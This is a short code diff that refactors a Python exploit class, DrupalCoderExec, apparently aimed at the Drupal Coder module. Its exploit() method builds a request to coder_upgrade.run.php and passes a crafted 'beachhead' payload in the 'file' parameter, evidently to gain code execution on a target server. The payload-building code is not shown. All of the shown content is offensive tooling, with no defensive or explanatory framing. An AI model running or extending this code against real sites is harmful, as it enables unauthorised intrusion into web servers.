@@ -6,12 +6,8 @@ import sys
 class DrupalCoderExec:
 
     WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
-    beachhead = ''
 
-    def __init__(self):
-        pass
-
-    def set_beachhead(self, beachhead: str):
+    def __init__(self, beachhead: str):
         self.beachhead = beachhead
 
     def create_payload(self, payload: str) -> str:
@@ -35,7 +31,6 @@ class DrupalCoderExec:
 
     def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
         url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
-        print(url)
         params = { 'file': self.create_payload(self.beachhead) }
         return requests.get(url=url, params=params)
 
